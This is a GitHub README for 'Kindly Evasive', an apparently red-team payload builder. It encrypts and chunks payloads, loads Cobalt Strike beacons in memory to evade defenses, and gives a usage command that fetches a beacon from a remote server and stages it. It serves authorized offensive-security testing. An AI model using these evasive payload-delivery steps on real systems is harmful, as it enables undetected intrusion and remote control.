

# Kindly Evasive

<div align="center">
  <img src="assets/kindlyevasive.jpg" width="25%" /><br />
</div>

<div align="center">
  <h1>Kindly Evasive</h1>
  <br/>

**Kindly Evasive** is a post-exploitation and Initial Access Payload (IAP) toolkit created by <a href="https://github.com/rottaj">@rottaj</a>
<br> It's designed for building and injecting payloads evasively into memory. It allows you to efficiently manage payloads, facilitating seamless operations during engagements.

> :warning: The use of this tool for malicious purposes is illegal and unethical. Always ensure that you have explicit permission to use this tool in any environment.

</div>


## Features

### Builder
- **Payload Creation:** Build and inject payload configurations into a custom PE section that loads them upon execution.
- **Payload Source:** Load unencrypted payloads from your local computer or a remote server.
- **Payload Encryption:** Encrypt payloads using various encryption methods.
- **Chunking:** Optionally separate the payload into multiple files (chunks) for enhanced flexibility.

### Payload Options
- **Shellcode Injection:** Support for injecting shellcode.
- **In-Memory PE Loader:** Features a PE loader capable of loading EXE, DLL, and Cobalt Strike beacons.

## Builder Arguments

```plaintext
Usage: ./KindlyBuilder [options]

https://github.com/rottaj/KindlyEvasive

Options:
   --help                       Display this help message.
   --output-dir                 Full file path including file name to output payload to.
   --verbose                    Print verbose output
   --debug                      Enables breakpoints and console ouput on payload file.

Encryption Options:
   --encryption-method          XOR, AES, RC4.
   --encryption-key             Encryption key to be used.

Payload Input Options:
   --local-file                 Load unencrypted payload file from local computer. Argument is the full file path to the payload file.
   --remote-file                Fetch unencrypted payload file from remote server. Argument is the full URL to the server hosting the payload file.

Payload Features:
   --payload-type               raw, dll, beacon
   --dummy-fetch                Make HTTP requests to dummy API's alongside payload requests.

Payload Delivery Options:
   --staging-server             URL of web server used to host initial access payloads after build is complete.
   --payload-size               Size of payload (bytes)
   --chunk-count                Split encrypted payload into multiple files. Example: -chunk 3 (will output 3 .bin files)
```


## Options

```plaintext
--help                       Display this help message.
--output-dir                 Full file path including file name to output payload to.
--verbose                    Print verbose output.
--debug                      Enables breakpoints and console output on the payload file.
```

### Encryption Options
```plaintext
--encryption-method          Specify encryption method (XOR, AES, RC4).
--encryption-key             Set the encryption key to be used.
```

### Payload Input Options
```plaintext
--local-file                 Load unencrypted payload file from local computer. Argument is the full file path to the payload file.
--remote-file                Fetch unencrypted payload file from remote server. Argument is the full URL to the server hosting the payload file.
```

### Payload Features
```plaintext
--payload-type               Specify type of payload (raw, dll, beacon).
--dummy-fetch                Make HTTP requests to dummy APIs alongside payload requests.
```

### Payload Delivery Options
```plaintext
--staging-server             URL of web server used to host initial access payloads after build is complete.
--payload-size               Size of payload in bytes.
--chunk-count                Split encrypted payload into multiple files. Example: --chunk 3 (will output 3 .bin files).
```

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/rottaj/KindlyEvasive.git
   cd KindlyEvasive 
   ```

2. Install required dependencies (if any).

3. Build the toolkit:
   ```bash
   cd KindlyBuilder
   cmake 
   ```

## Usage

To get started with Kindly Evasive, run the following command:

```bash
.\KindlyBuilder -h

.\KindlyBuilder.exe --output-dir C:\Payloads\testing.exe --encryption-method XOR --remote-file http://192.168.1.124:8080/beacon_x64.bin 
--payload-size 304128 --payload-type beacon --staging-server http://192.168.1.124:8080/ --chunk-count 3
```

## KindlyEvasive in action

:point_down: Some Gifs might take a some time to load.  :point_down:
![alt text](https://github.com/rottaj/KindlyEvasive/blob/main/assets/Builder.png?raw=true)
![alt text](https://github.com/rottaj/KindlyEvasive/blob/main/assets/Delivery.gif?raw=true)
![alt text](https://github.com/rottaj/KindlyEvasive/blob/main/assets/Beaconing.gif?raw=true)
![alt text](https://github.com/rottaj/KindlyEvasive/blob/main/assets/Defender.png?raw=true)

## Disclaimer
Use this software responsibly and only in environments where you have legal permission.<br>
The author of this tool is not responsible for any misuse or damages caused.

## Contributing

Contributions are welcome! Please fork the repository and submit a pull request for any features or improvements.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

For any questions or support, feel free to open an issue in the repository or reach out to the maintainers. Happy testing!
